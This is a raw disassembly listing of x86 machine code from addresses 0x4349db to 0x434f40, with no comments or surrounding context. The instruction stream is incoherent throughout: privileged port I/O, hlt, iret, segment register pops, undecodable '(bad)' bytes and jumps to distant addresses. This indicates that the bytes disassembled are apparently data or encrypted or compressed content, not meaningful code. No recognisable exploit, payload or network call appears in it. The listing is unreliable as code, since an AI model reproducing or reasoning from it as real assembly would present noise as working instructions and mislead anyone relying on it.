  4349db:	81 c0 85 0d 1f 71    	add    $0x711f0d85,%eax
  4349e1:	37                   	aaa
  4349e2:	78 78                	js     0x434a5c
  4349e4:	a8 0a                	test   $0xa,%al
  4349e6:	18 c6                	sbb    %al,%dh
  4349e8:	71 ae                	jno    0x434998
  4349ea:	4f                   	dec    %edi
  4349eb:	01 44 fc 10          	add    %eax,0x10(%esp,%edi,8)
  4349ef:	d4 11                	aam    $0x11
  4349f1:	8a 72 3d             	mov    0x3d(%edx),%dh
  4349f4:	91                   	xchg   %eax,%ecx
  4349f5:	39 a6 89 c5 7d e5    	cmp    %esp,-0x1a823a77(%esi)
  4349fb:	d5 d2                	aad    $0xd2
  4349fd:	82 4f ec ff          	orb    $0xff,-0x14(%edi)
  434a01:	6b da c6             	imul   $0xffffffc6,%edx,%ebx
  434a04:	bf 94 91 73 35       	mov    $0x35739194,%edi
  434a09:	c8 c7 bb de          	enter  $0xbbc7,$0xde
  434a0d:	28 ce                	sub    %cl,%dh
  434a0f:	4f                   	dec    %edi
  434a10:	fc                   	cld
  434a11:	ec                   	in     (%dx),%al
  434a12:	97                   	xchg   %eax,%edi
  434a13:	85 c0                	test   %eax,%eax
  434a15:	a3 1c e2 69 69       	mov    %eax,0x6969e21c
  434a1a:	0b c7                	or     %edi,%eax
  434a1c:	38 f6                	cmp    %dh,%dh
  434a1e:	95                   	xchg   %eax,%ebp
  434a1f:	2e b8 50 4b 46 77    	cs mov $0x77464b50,%eax
  434a25:	b1 03                	mov    $0x3,%cl
  434a27:	89 c3                	mov    %eax,%ebx
  434a29:	7d fe                	jge    0x434a29
  434a2b:	4d                   	dec    %ebp
  434a2c:	54                   	push   %esp
  434a2d:	0c ea                	or     $0xea,%al
  434a2f:	a1 63 3a ad 24       	mov    0x24ad3a63,%eax
  434a34:	6a 18                	push   $0x18
  434a36:	4d                   	dec    %ebp
  434a37:	14 3b                	adc    $0x3b,%al
  434a39:	35 ef 9a 51 12       	xor    $0x12519aef,%eax
  434a3e:	6c                   	insb   (%dx),%es:(%edi)
  434a3f:	e0 37                	loopne 0x434a78
  434a41:	97                   	xchg   %eax,%edi
  434a42:	9f                   	lahf
  434a43:	68 a5 7f 05 22       	push   $0x22057fa5
  434a48:	02 b2 91 d9 72 81    	add    -0x7e8d266f(%edx),%dh
  434a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  434a4f:	07                   	pop    %es
  434a50:	14 fa                	adc    $0xfa,%al
  434a52:	e6 bd                	out    %al,$0xbd
  434a54:	0b aa 90 b4 ef 9a    	or     -0x65104b70(%edx),%ebp
  434a5a:	6e                   	outsb  %ds:(%esi),(%dx)
  434a5b:	45                   	inc    %ebp
  434a5c:	6a 25                	push   $0x25
  434a5e:	df f7                	fcomip %st(7),%st
  434a60:	e4 73                	in     $0x73,%al
  434a62:	46                   	inc    %esi
  434a63:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434a64:	3c 53                	cmp    $0x53,%al
  434a66:	38 39                	cmp    %bh,(%ecx)
  434a68:	12 c6                	adc    %dh,%al
  434a6a:	e8 c9 06 d9 49       	call   0x4a1c5138
  434a6f:	cc                   	int3
  434a70:	d9 1b                	fstps  (%ebx)
  434a72:	87 4d fc             	xchg   %ecx,-0x4(%ebp)
  434a75:	c5 cf 57             	(bad)
  434a78:	0e                   	push   %cs
  434a79:	da 9d c9 7b 82 a3    	ficompl -0x5c7d8437(%ebp)
  434a7f:	d5 a0                	aad    $0xa0
  434a81:	41                   	inc    %ecx
  434a82:	0f f3 17             	psllq  (%edi),%mm2
  434a85:	19 fb                	sbb    %edi,%ebx
  434a87:	41                   	inc    %ecx
  434a88:	e4 ed                	in     $0xed,%al
  434a8a:	07                   	pop    %es
  434a8b:	8b 28                	mov    (%eax),%ebp
  434a8d:	83 b5 c0 74 f1 a6 78 	xorl   $0x78,-0x590e8b40(%ebp)
  434a94:	96                   	xchg   %eax,%esi
  434a95:	0e                   	push   %cs
  434a96:	f4                   	hlt
  434a97:	3f                   	aas
  434a98:	5a                   	pop    %edx
  434a99:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  434a9a:	e0 35                	loopne 0x434ad1
  434a9c:	7d e9                	jge    0x434a87
  434a9e:	26 a1 b4 6e 66 f3    	mov    %es:0xf3666eb4,%eax
  434aa4:	f4                   	hlt
  434aa5:	f1                   	int1
  434aa6:	c0 5d 7e c1          	rcrb   $0xc1,0x7e(%ebp)
  434aaa:	38 e0                	cmp    %ah,%al
  434aac:	46                   	inc    %esi
  434aad:	5c                   	pop    %esp
  434aae:	68 1f e2 72 f9       	push   $0xf972e21f
  434ab3:	38 ca                	cmp    %cl,%dl
  434ab5:	63 fb                	arpl   %edi,%ebx
  434ab7:	0e                   	push   %cs
  434ab8:	e8 6c be 28 4e       	call   0x4e6c0929
  434abd:	11 58 35             	adc    %ebx,0x35(%eax)
  434ac0:	9d                   	popf
  434ac1:	51                   	push   %ecx
  434ac2:	b0 1b                	mov    $0x1b,%al
  434ac4:	ed                   	in     (%dx),%eax
  434ac5:	02 19                	add    (%ecx),%bl
  434ac7:	89 cd                	mov    %ecx,%ebp
  434ac9:	6d                   	insl   (%dx),%es:(%edi)
  434aca:	36 60                	ss pusha
  434acc:	cf                   	iret
  434acd:	e3 dd                	jecxz  0x434aac
  434acf:	d4 d9                	aam    $0xd9
  434ad1:	93                   	xchg   %eax,%ebx
  434ad2:	d0 1f                	rcrb   $1,(%edi)
  434ad4:	d3 b8 56 d8 bc 80    	sarl   %cl,-0x7f4327aa(%eax)
  434ada:	51                   	push   %ecx
  434adb:	0f 4f 2b             	cmovg  (%ebx),%ebp
  434ade:	a8 1f                	test   $0x1f,%al
  434ae0:	71 19                	jno    0x434afb
  434ae2:	d3 c7                	rol    %cl,%edi
  434ae4:	37                   	aaa
  434ae5:	36 1f                	ss pop %ds
  434ae7:	47                   	inc    %edi
  434ae8:	62 98 84 3f 88 5a    	bound  %ebx,0x5a883f84(%eax)
  434aee:	b0 7d                	mov    $0x7d,%al
  434af0:	ec                   	in     (%dx),%al
  434af1:	6a 35                	push   $0x35
  434af3:	65 7a f7             	gs jp  0x434aed
  434af6:	45                   	inc    %ebp
  434af7:	1e                   	push   %ds
  434af8:	fd                   	std
  434af9:	0c 1e                	or     $0x1e,%al
  434afb:	29 3a                	sub    %edi,(%edx)
  434afd:	f1                   	int1
  434afe:	17                   	pop    %ss
  434aff:	71 96                	jno    0x434a97
  434b01:	ca ab 5b             	lret   $0x5bab
  434b04:	f4                   	hlt
  434b05:	6b 12 86             	imul   $0xffffff86,(%edx),%edx
  434b08:	df b9 56 28 02 2c    	fistpll 0x2c022856(%ecx)
  434b0e:	54                   	push   %esp
  434b0f:	b9 70 d4 d3 31       	mov    $0x31d3d470,%ecx
  434b14:	e3 d3                	jecxz  0x434ae9
  434b16:	7d e4                	jge    0x434afc
  434b18:	3c 9e                	cmp    $0x9e,%al
  434b1a:	47                   	inc    %edi
  434b1b:	51                   	push   %ecx
  434b1c:	55                   	push   %ebp
  434b1d:	4c                   	dec    %esp
  434b1e:	4c                   	dec    %esp
  434b1f:	e9 15 71 0f bc       	jmp    0xbc52bc39
  434b24:	cc                   	int3
  434b25:	12 3a                	adc    (%edx),%bh
  434b27:	0a 7c c1 f5          	or     -0xb(%ecx,%eax,8),%bh
  434b2b:	91                   	xchg   %eax,%ecx
  434b2c:	90                   	nop
  434b2d:	61                   	popa
  434b2e:	56                   	push   %esi
  434b2f:	81 58 77 a8 2b 1b f3 	sbbl   $0xf31b2ba8,0x77(%eax)
  434b36:	32 d1                	xor    %cl,%dl
  434b38:	e9 77 19 91 f0       	jmp    0xf0d464b4
  434b3d:	13 c1                	adc    %ecx,%eax
  434b3f:	66 4b                	dec    %bx
  434b41:	1f                   	pop    %ds
  434b42:	0b 53 2c             	or     0x2c(%ebx),%edx
  434b45:	10 1b                	adc    %bl,(%ebx)
  434b47:	33 8f 3e d8 f6 f5    	xor    -0xa0927c2(%edi),%ecx
  434b4d:	5f                   	pop    %edi
  434b4e:	d0 87 64 f6 4a 9c    	rolb   $1,-0x63b5099c(%edi)
  434b54:	4c                   	dec    %esp
  434b55:	5d                   	pop    %ebp
  434b56:	6b 94 ce 95 ac 28 5e 	imul   $0x45,0x5e28ac95(%esi,%ecx,8),%edx
  434b5d:	45 
  434b5e:	e5 f5                	in     $0xf5,%eax
  434b60:	b0 63                	mov    $0x63,%al
  434b62:	1d 27 24 17 69       	sbb    $0x69172427,%eax
  434b67:	9d                   	popf
  434b68:	b9 50 26 1e 9f       	mov    $0x9f1e2650,%ecx
  434b6d:	40                   	inc    %eax
  434b6e:	84 fb                	test   %bh,%bl
  434b70:	72 74                	jb     0x434be6
  434b72:	d1 5e bf             	rcrl   $1,-0x41(%esi)
  434b75:	2d c4 de 6b d7       	sub    $0xd76bdec4,%eax
  434b7a:	e4 0a                	in     $0xa,%al
  434b7c:	0b 4b b7             	or     -0x49(%ebx),%ecx
  434b7f:	74 45                	je     0x434bc6
  434b81:	2c 6d                	sub    $0x6d,%al
  434b83:	19 05 35 a7 a2 9b    	sbb    %eax,0x9ba2a735
  434b89:	62 73 23             	bound  %esi,0x23(%ebx)
  434b8c:	1c 39                	sbb    $0x39,%al
  434b8e:	dc 23                	fsubl  (%ebx)
  434b90:	6d                   	insl   (%dx),%es:(%edi)
  434b91:	16                   	push   %ss
  434b92:	b6 ad                	mov    $0xad,%dh
  434b94:	64 49                	fs dec %ecx
  434b96:	6e                   	outsb  %ds:(%esi),(%dx)
  434b97:	b6 a4                	mov    $0xa4,%dh
  434b99:	3c 3b                	cmp    $0x3b,%al
  434b9b:	33 00                	xor    (%eax),%eax
  434b9d:	8d                   	lea    (bad),%esi
  434b9e:	f7 68 0d             	imull  0xd(%eax)
  434ba1:	6d                   	insl   (%dx),%es:(%edi)
  434ba2:	e9 c1 b8 8f 8b       	jmp    0x8bd30468
  434ba7:	1b 90 63 10 07 74    	sbb    0x74071063(%eax),%edx
  434bad:	b5 69                	mov    $0x69,%ch
  434baf:	ed                   	in     (%dx),%eax
  434bb0:	7e 69                	jle    0x434c1b
  434bb2:	86 d5                	xchg   %dl,%ch
  434bb4:	80 83 cd 83 a3 f5 c2 	addb   $0xc2,-0xa5c7c33(%ebx)
  434bbb:	41                   	inc    %ecx
  434bbc:	88 3a                	mov    %bh,(%edx)
  434bbe:	8c d4                	mov    %ss,%esp
  434bc0:	c2 24 8a             	ret    $0x8a24
  434bc3:	4c                   	dec    %esp
  434bc4:	c9                   	leave
  434bc5:	b9 2b fc dd 45       	mov    $0x45ddfc2b,%ecx
  434bca:	78 fa                	js     0x434bc6
  434bcc:	68 43 2e c6 31       	push   $0x31c62e43
  434bd1:	78 ac                	js     0x434b7f
  434bd3:	de 0c 87             	fimuls (%edi,%eax,4)
  434bd6:	29 9d 04 04 fb 84    	sub    %ebx,-0x7b04fbfc(%ebp)
  434bdc:	14 45                	adc    $0x45,%al
  434bde:	49                   	dec    %ecx
  434bdf:	55                   	push   %ebp
  434be0:	44                   	inc    %esp
  434be1:	6e                   	outsb  %ds:(%esi),(%dx)
  434be2:	8f                   	(bad)
  434be3:	d1 91 af b9 05 95    	rcll   $1,-0x6afa4651(%ecx)
  434be9:	85 06                	test   %eax,(%esi)
  434beb:	c0 73 43 ad          	shlb   $0xad,0x43(%ebx)
  434bef:	1c ac                	sbb    $0xac,%al
  434bf1:	71 f1                	jno    0x434be4
  434bf3:	d8 d7                	fcom   %st(7)
  434bf5:	19 b1 c3 84 69 ac    	sbb    %esi,-0x53967b3d(%ecx)
  434bfb:	0d 0e c9 f2 85       	or     $0x85f2c90e,%eax
  434c00:	0a b7 1d 94 5c 7e    	or     0x7e5c941d(%edi),%dh
  434c06:	c0 45 47 fd          	rolb   $0xfd,0x47(%ebp)
  434c0a:	5a                   	pop    %edx
  434c0b:	0a 0f                	or     (%edi),%cl
  434c0d:	15 46 3b 1e f8       	adc    $0xf81e3b46,%eax
  434c12:	e1 cb                	loope  0x434bdf
  434c14:	1a 18                	sbb    (%eax),%bl
  434c16:	27                   	daa
  434c17:	a3 c3 bc 60 71       	mov    %eax,0x7160bcc3
  434c1c:	cf                   	iret
  434c1d:	b1 19                	mov    $0x19,%cl
  434c1f:	57                   	push   %edi
  434c20:	1f                   	pop    %ds
  434c21:	46                   	inc    %esi
  434c22:	d8 39                	fdivrs (%ecx)
  434c24:	47                   	inc    %edi
  434c25:	50                   	push   %eax
  434c26:	d7                   	xlat   %ds:(%ebx)
  434c27:	c5 77 57             	lds    0x57(%edi),%esi
  434c2a:	54                   	push   %esp
  434c2b:	92                   	xchg   %eax,%edx
  434c2c:	2c 14                	sub    $0x14,%al
  434c2e:	c5 be 2d 8b 48 ac    	lds    -0x53b774d3(%esi),%edi
  434c34:	d9 6c 14 c3          	fldcw  -0x3d(%esp,%edx,1)
  434c38:	62 a7 90 78 7c e7    	bound  %esp,-0x18838770(%edi)
  434c3e:	fb                   	sti
  434c3f:	c9                   	leave
  434c40:	af                   	scas   %es:(%edi),%eax
  434c41:	85 11                	test   %edx,(%ecx)
  434c43:	40                   	inc    %eax
  434c44:	8c cf                	mov    %cs,%edi
  434c46:	51                   	push   %ecx
  434c47:	df f2                	fcomip %st(2),%st
  434c49:	1f                   	pop    %ds
  434c4a:	0c 80                	or     $0x80,%al
  434c4c:	1c f5                	sbb    $0xf5,%al
  434c4e:	3c 7b                	cmp    $0x7b,%al
  434c50:	b9 5a 35 32 40       	mov    $0x4032355a,%ecx
  434c55:	97                   	xchg   %eax,%edi
  434c56:	a3 ae c7 30 c2       	mov    %eax,0xc230c7ae
  434c5b:	45                   	inc    %ebp
  434c5c:	0b 13                	or     (%ebx),%edx
  434c5e:	03 56 4d             	add    0x4d(%esi),%edx
  434c61:	32 6f 71             	xor    0x71(%edi),%ch
  434c64:	93                   	xchg   %eax,%ebx
  434c65:	5a                   	pop    %edx
  434c66:	95                   	xchg   %eax,%ebp
  434c67:	6d                   	insl   (%dx),%es:(%edi)
  434c68:	09 dd                	or     %ebx,%ebp
  434c6a:	28 ce                	sub    %cl,%dh
  434c6c:	1c 0c                	sbb    $0xc,%al
  434c6e:	cd 2b                	int    $0x2b
  434c70:	a9 3c b2 bc 29       	test   $0x29bcb23c,%eax
  434c75:	84 2b                	test   %ch,(%ebx)
  434c77:	22 58 35             	and    0x35(%eax),%bl
  434c7a:	f3 a7                	repz cmpsl %es:(%edi),%ds:(%esi)
  434c7c:	c9                   	leave
  434c7d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  434c7e:	71 5c                	jno    0x434cdc
  434c80:	bc 52 b8 4f 73       	mov    $0x734fb852,%esp
  434c85:	b3 41                	mov    $0x41,%bl
  434c87:	47                   	inc    %edi
  434c88:	70 0b                	jo     0x434c95
  434c8a:	44                   	inc    %esp
  434c8b:	20 f6                	and    %dh,%dh
  434c8d:	4d                   	dec    %ebp
  434c8e:	9e                   	sahf
  434c8f:	88 fd                	mov    %bh,%ch
  434c91:	64 ec                	fs in  (%dx),%al
  434c93:	8e 4a 0f             	mov    0xf(%edx),%cs
  434c96:	32 7a 3b             	xor    0x3b(%edx),%bh
  434c99:	12 2b                	adc    (%ebx),%ch
  434c9b:	50                   	push   %eax
  434c9c:	ee                   	out    %al,(%dx)
  434c9d:	4f                   	dec    %edi
  434c9e:	44                   	inc    %esp
  434c9f:	41                   	inc    %ecx
  434ca0:	74 cf                	je     0x434c71
  434ca2:	2b 5b 03             	sub    0x3(%ebx),%ebx
  434ca5:	e6 0c                	out    %al,$0xc
  434ca7:	65 09 40 76          	or     %eax,%gs:0x76(%eax)
  434cab:	8c fe                	mov    %?,%esi
  434cad:	d0 ac b7 1e 4f 0e cd 	shrb   $1,-0x32f1b0e2(%edi,%esi,4)
  434cb4:	0b 7f 33             	or     0x33(%edi),%edi
  434cb7:	75 74                	jne    0x434d2d
  434cb9:	6d                   	insl   (%dx),%es:(%edi)
  434cba:	36 6d                	ss insl (%dx),%es:(%edi)
  434cbc:	95                   	xchg   %eax,%ebp
  434cbd:	93                   	xchg   %eax,%ebx
  434cbe:	a1 5a bc a8 30       	mov    0x30a8bc5a,%eax
  434cc3:	01 56 e3             	add    %edx,-0x1d(%esi)
  434cc6:	b3 b2                	mov    $0xb2,%bl
  434cc8:	d3 ac ec b1 26 09 35 	shrl   %cl,0x350926b1(%esp,%ebp,8)
  434ccf:	d8 9e 0b 27 65 95    	fcomps -0x6a9ad8f5(%esi)
  434cd5:	12 b0 c5 12 7f 08    	adc    0x87f12c5(%eax),%dh
  434cdb:	ad                   	lods   %ds:(%esi),%eax
  434cdc:	68 a8 a6 80 0e       	push   $0xe80a6a8
  434ce1:	65 38 cd             	gs cmp %cl,%ch
  434ce4:	c6                   	(bad)
  434ce5:	76 3a                	jbe    0x434d21
  434ce7:	96                   	xchg   %eax,%esi
  434ce8:	3a 34 c2             	cmp    (%edx,%eax,8),%dh
  434ceb:	3d b9 c5 de a7       	cmp    $0xa7dec5b9,%eax
  434cf0:	d4 af                	aam    $0xaf
  434cf2:	13 66 16             	adc    0x16(%esi),%esp
  434cf5:	e9 5f 6b 6a db       	jmp    0xdbadb859
  434cfa:	aa                   	stos   %al,%es:(%edi)
  434cfb:	3a 72 32             	cmp    0x32(%edx),%dh
  434cfe:	be 84 40 02 90       	mov    $0x90024084,%esi
  434d03:	da 50 62             	ficoml 0x62(%eax)
  434d06:	d7                   	xlat   %ds:(%ebx)
  434d07:	f3 41                	repz inc %ecx
  434d09:	8d ad f8 16 db 7b    	lea    0x7bdb16f8(%ebp),%ebp
  434d0f:	ae                   	scas   %es:(%edi),%al
  434d10:	c5 54 16 7f          	lds    0x7f(%esi,%edx,1),%edx
  434d14:	9c                   	pushf
  434d15:	b3 d4                	mov    $0xd4,%bl
  434d17:	7e 62                	jle    0x434d7b
  434d19:	1d c7 ce e2 83       	sbb    $0x83e2cec7,%eax
  434d1e:	10 da                	adc    %bl,%dl
  434d20:	57                   	push   %edi
  434d21:	fa                   	cli
  434d22:	ad                   	lods   %ds:(%esi),%eax
  434d23:	f0 aa                	lock stos %al,%es:(%edi)
  434d25:	70 00                	jo     0x434d27
  434d27:	fc                   	cld
  434d28:	4e                   	dec    %esi
  434d29:	f4                   	hlt
  434d2a:	94                   	xchg   %eax,%esp
  434d2b:	83 a5 66 20 ed 8a 70 	andl   $0x70,-0x7512df9a(%ebp)
  434d32:	d0 e8                	shr    $1,%al
  434d34:	d1 e1                	shl    $1,%ecx
  434d36:	d6                   	salc
  434d37:	f0 67 ed             	lock addr16 in (%dx),%eax
  434d3a:	28 ad 16 43 85 6c    	sub    %ch,0x6c854316(%ebp)
  434d40:	ed                   	in     (%dx),%eax
  434d41:	3a 71 36             	cmp    0x36(%ecx),%dh
  434d44:	48                   	dec    %eax
  434d45:	cd 44                	int    $0x44
  434d47:	83 c1 ed             	add    $0xffffffed,%ecx
  434d4a:	ac                   	lods   %ds:(%esi),%al
  434d4b:	28 6b de             	sub    %ch,-0x22(%ebx)
  434d4e:	bb 0b 56 2f 70       	mov    $0x702f560b,%ebx
  434d53:	d1 c9                	ror    $1,%ecx
  434d55:	d7                   	xlat   %ds:(%ebx)
  434d56:	51                   	push   %ecx
  434d57:	35 bf a8 50 c2       	xor    $0xc250a8bf,%eax
  434d5c:	3c 66                	cmp    $0x66,%al
  434d5e:	28 57 e9             	sub    %dl,-0x17(%edi)
  434d61:	ea d0 02 3e 99 53 0f 	ljmp   $0xf53,$0x993e02d0
  434d68:	76 53                	jbe    0x434dbd
  434d6a:	da 86 39 63 95 84    	fiaddl -0x7b6a9cc7(%esi)
  434d70:	c6                   	(bad)
  434d71:	ed                   	in     (%dx),%eax
  434d72:	58                   	pop    %eax
  434d73:	a0 62 49 88 ae       	mov    0xae884962,%al
  434d78:	ce                   	into
  434d79:	e3 dd                	jecxz  0x434d58
  434d7b:	bf 45 0f 2e a7       	mov    $0xa72e0f45,%edi
  434d80:	e1 b3                	loope  0x434d35
  434d82:	39 6c 0d c0          	cmp    %ebp,-0x40(%ebp,%ecx,1)
  434d86:	17                   	pop    %ss
  434d87:	15 9a b3 2c 16       	adc    $0x162cb39a,%eax
  434d8c:	e5 ba                	in     $0xba,%eax
  434d8e:	df 9c 1f 5a a6 16 05 	fistps 0x516a65a(%edi,%ebx,1)
  434d95:	95                   	xchg   %eax,%ebp
  434d96:	7b b9                	jnp    0x434d51
  434d98:	34 55                	xor    $0x55,%al
  434d9a:	b5 19                	mov    $0x19,%ch
  434d9c:	3b 30                	cmp    (%eax),%esi
  434d9e:	ac                   	lods   %ds:(%esi),%al
  434d9f:	59                   	pop    %ecx
  434da0:	c5 c7 47             	(bad)
  434da3:	d0 b1 d3 07 87 5d    	shlb   $1,0x5d8707d3(%ecx)
  434da9:	a9 5f 03 8c d7       	test   $0xd78c035f,%eax
  434dae:	bd d0 b4 ee fe       	mov    $0xfeeeb4d0,%ebp
  434db3:	fc                   	cld
  434db4:	a0 c7 df 7a 5b       	mov    0x5b7adfc7,%al
  434db9:	36 b6 c5             	ss mov $0xc5,%dh
  434dbc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  434dbd:	b3 15                	mov    $0x15,%bl
  434dbf:	b9 52 0a 9e dc       	mov    $0xdc9e0a52,%ecx
  434dc4:	78 b0                	js     0x434d76
  434dc6:	fc                   	cld
  434dc7:	ef                   	out    %eax,(%dx)
  434dc8:	7b 03                	jnp    0x434dcd
  434dca:	64 19 39             	sbb    %edi,%fs:(%ecx)
  434dcd:	ce                   	into
  434dce:	ff c5                	inc    %ebp
  434dd0:	47                   	inc    %edi
  434dd1:	47                   	inc    %edi
  434dd2:	39 3d 4d e1 f3 0b    	cmp    %edi,0xbf3e14d
  434dd8:	cf                   	iret
  434dd9:	45                   	inc    %ebp
  434dda:	39 2a                	cmp    %ebp,(%edx)
  434ddc:	7d a5                	jge    0x434d83
  434dde:	bd b3 d7 48 f1       	mov    $0xf148d7b3,%ebp
  434de3:	70 db                	jo     0x434dc0
  434de5:	93                   	xchg   %eax,%ebx
  434de6:	6c                   	insb   (%dx),%es:(%edi)
  434de7:	c2 32 74             	ret    $0x7432
  434dea:	00 06                	add    %al,(%esi)
  434dec:	5c                   	pop    %esp
  434ded:	73 6e                	jae    0x434e5d
  434def:	1e                   	push   %ds
  434df0:	e0 3a                	loopne 0x434e2c
  434df2:	32 6d 90             	xor    -0x70(%ebp),%ch
  434df5:	e1 3d                	loope  0x434e34
  434df7:	9f                   	lahf
  434df8:	a9 c4 5f 41 b2       	test   $0xb2415fc4,%eax
  434dfd:	10 29                	adc    %ch,(%ecx)
  434dff:	8b c0                	mov    %eax,%eax
  434e01:	40                   	inc    %eax
  434e02:	43                   	inc    %ebx
  434e03:	99                   	cltd
  434e04:	67 75 d4             	addr16 jne 0x434ddb
  434e07:	1c f5                	sbb    $0xf5,%al
  434e09:	a9 78 c7 5e f8       	test   $0xf85ec778,%eax
  434e0e:	64 4e                	fs dec %esi
  434e10:	e3 a2                	jecxz  0x434db4
  434e12:	e3 45                	jecxz  0x434e59
  434e14:	62 b7 34 b9 0e c0    	bound  %esi,-0x3ff146cc(%edi)
  434e1a:	61                   	popa
  434e1b:	8f                   	(bad)
  434e1c:	6f                   	outsl  %ds:(%esi),(%dx)
  434e1d:	43                   	inc    %ebx
  434e1e:	12 c9                	adc    %cl,%cl
  434e20:	9b                   	fwait
  434e21:	eb 8e                	jmp    0x434db1
  434e23:	7e db                	jle    0x434e00
  434e25:	3f                   	aas
  434e26:	60                   	pusha
  434e27:	70 ad                	jo     0x434dd6
  434e29:	32 5d 72             	xor    0x72(%ebp),%bl
  434e2c:	fd                   	std
  434e2d:	30 e1                	xor    %ah,%cl
  434e2f:	60                   	pusha
  434e30:	6d                   	insl   (%dx),%es:(%edi)
  434e31:	23 d8                	and    %eax,%ebx
  434e33:	23 36                	and    (%esi),%esi
  434e35:	70 2d                	jo     0x434e64
  434e37:	d3 73 69             	shll   %cl,0x69(%ebx)
  434e3a:	ce                   	into
  434e3b:	56                   	push   %esi
  434e3c:	56                   	push   %esi
  434e3d:	4b                   	dec    %ebx
  434e3e:	4a                   	dec    %edx
  434e3f:	04 55                	add    $0x55,%al
  434e41:	0d 15 b9 be 40       	or     $0x40beb915,%eax
  434e46:	cc                   	int3
  434e47:	08 27                	or     %ah,(%edi)
  434e49:	c4 22                	les    (%edx),%esp
  434e4b:	d8 df                	fcomp  %st(7)
  434e4d:	1c 69                	sbb    $0x69,%al
  434e4f:	5b                   	pop    %ebx
  434e50:	04 02                	add    $0x2,%al
  434e52:	77 56                	ja     0x434eaa
  434e54:	36 06                	ss push %es
  434e56:	bd d5 e1 26 30       	mov    $0x3026e1d5,%ebp
  434e5b:	85 f4                	test   %esi,%esp
  434e5d:	e4 8a                	in     $0x8a,%al
  434e5f:	fb                   	sti
  434e60:	6d                   	insl   (%dx),%es:(%edi)
  434e61:	f8                   	clc
  434e62:	bd e1 57 e3 46       	mov    $0x46e357e1,%ebp
  434e67:	0a 2e                	or     (%esi),%ch
  434e69:	1a 5f a8             	sbb    -0x58(%edi),%bl
  434e6c:	a3 33 5c 42 bd       	mov    %eax,0xbd425c33
  434e71:	12 4c d8 f3          	adc    -0xd(%eax,%ebx,8),%cl
  434e75:	91                   	xchg   %eax,%ecx
  434e76:	96                   	xchg   %eax,%esi
  434e77:	c7                   	(bad)
  434e78:	0d f2 b4 64 8e       	or     $0x8e64b4f2,%eax
  434e7d:	ca a3 47             	lret   $0x47a3
  434e80:	04 cf                	add    $0xcf,%al
  434e82:	41                   	inc    %ecx
  434e83:	84 b3 4f 57 50 d4    	test   %dh,-0x2bafa8b1(%ebx)
  434e89:	2f                   	das
  434e8a:	1b 6d 87             	sbb    -0x79(%ebp),%ebp
  434e8d:	47                   	inc    %edi
  434e8e:	c2 91 75             	ret    $0x7591
  434e91:	b2 85                	mov    $0x85,%dl
  434e93:	b4 2c                	mov    $0x2c,%ah
  434e95:	6d                   	insl   (%dx),%es:(%edi)
  434e96:	fc                   	cld
  434e97:	01 98 43 7f a7 2c    	add    %ebx,0x2ca77f43(%eax)
  434e9d:	5a                   	pop    %edx
  434e9e:	9e                   	sahf
  434e9f:	7e 05                	jle    0x434ea6
  434ea1:	08 42 df             	or     %al,-0x21(%edx)
  434ea4:	10 e4                	adc    %ah,%ah
  434ea6:	63 41 6e             	arpl   %eax,0x6e(%ecx)
  434ea9:	f9                   	stc
  434eaa:	6e                   	outsb  %ds:(%esi),(%dx)
  434eab:	e2 85                	loop   0x434e32
  434ead:	f5                   	cmc
  434eae:	9c                   	pushf
  434eaf:	cd 1f                	int    $0x1f
  434eb1:	1c 3e                	sbb    $0x3e,%al
  434eb3:	1a 89 73 a1 b2 da    	sbb    -0x254d5e8d(%ecx),%cl
  434eb9:	e4 11                	in     $0x11,%al
  434ebb:	16                   	push   %ss
  434ebc:	5a                   	pop    %edx
  434ebd:	4f                   	dec    %edi
  434ebe:	de a0 2e 18 9a 68    	fisubs 0x689a182e(%eax)
  434ec4:	ee                   	out    %al,(%dx)
  434ec5:	9f                   	lahf
  434ec6:	11 f6                	adc    %esi,%esi
  434ec8:	2c 3d                	sub    $0x3d,%al
  434eca:	ef                   	out    %eax,(%dx)
  434ecb:	2d 3b e0 65 85       	sub    $0x8565e03b,%eax
  434ed0:	fe                   	(bad)
  434ed1:	b9 1f fe 12 ef       	mov    $0xef12fe1f,%ecx
  434ed6:	bd 38 90 50 e0       	mov    $0xe0509038,%ebp
  434edb:	44                   	inc    %esp
  434edc:	d0 54 27 e1          	rclb   $1,-0x1f(%edi,%eiz,1)
  434ee0:	f6 68 63             	imulb  0x63(%eax)
  434ee3:	91                   	xchg   %eax,%ecx
  434ee4:	16                   	push   %ss
  434ee5:	e9 98 80 e7 13       	jmp    0x142acf82
  434eea:	ff 53 fc             	call   *-0x4(%ebx)
  434eed:	46                   	inc    %esi
  434eee:	6b 93 b2 55 35 f4 dc 	imul   $0xffffffdc,-0xbcaaa4e(%ebx),%edx
  434ef5:	d8 fe                	fdivr  %st(6),%st
  434ef7:	ec                   	in     (%dx),%al
  434ef8:	17                   	pop    %ss
  434ef9:	0f cc                	bswap  %esp
  434efb:	f4                   	hlt
  434efc:	0b 7d c9             	or     -0x37(%ebp),%edi
  434eff:	02 9d 8a c6 0b 5e    	add    0x5e0bc68a(%ebp),%bl
  434f05:	2f                   	das
  434f06:	d9 74 9a 31          	fnstenv 0x31(%edx,%ebx,4)
  434f0a:	ca cb 66             	lret   $0x66cb
  434f0d:	3f                   	aas
  434f0e:	41                   	inc    %ecx
  434f0f:	1b dd                	sbb    %ebp,%ebx
  434f11:	0e                   	push   %cs
  434f12:	b8 b2 8a 74 18       	mov    $0x18748ab2,%eax
  434f17:	f4                   	hlt
  434f18:	48                   	dec    %eax
  434f19:	30 49 e2             	xor    %cl,-0x1e(%ecx)
  434f1c:	9d                   	popf
  434f1d:	c4 3f                	les    (%edi),%edi
  434f1f:	94                   	xchg   %eax,%esp
  434f20:	25 89 25 1f 58       	and    $0x581f2589,%eax
  434f25:	20 0b                	and    %cl,(%ebx)
  434f27:	d2 4b fc             	rorb   %cl,-0x4(%ebx)
  434f2a:	ef                   	out    %eax,(%dx)
  434f2b:	f9                   	stc
  434f2c:	61                   	popa
  434f2d:	ea d6 fb 39 39 4b ea 	ljmp   $0xea4b,$0x3939fbd6
  434f34:	40                   	inc    %eax
  434f35:	76 09                	jbe    0x434f40
  434f37:	7f 47                	jg     0x434f80
  434f39:	eb de                	jmp    0x434f19
  434f3b:	2b 75 c0             	sub    -0x40(%ebp),%esi
  434f3e:	0c 15                	or     $0x15,%al
  434f40:	d1 43 1a             	roll   $1,0x1a(%ebx)
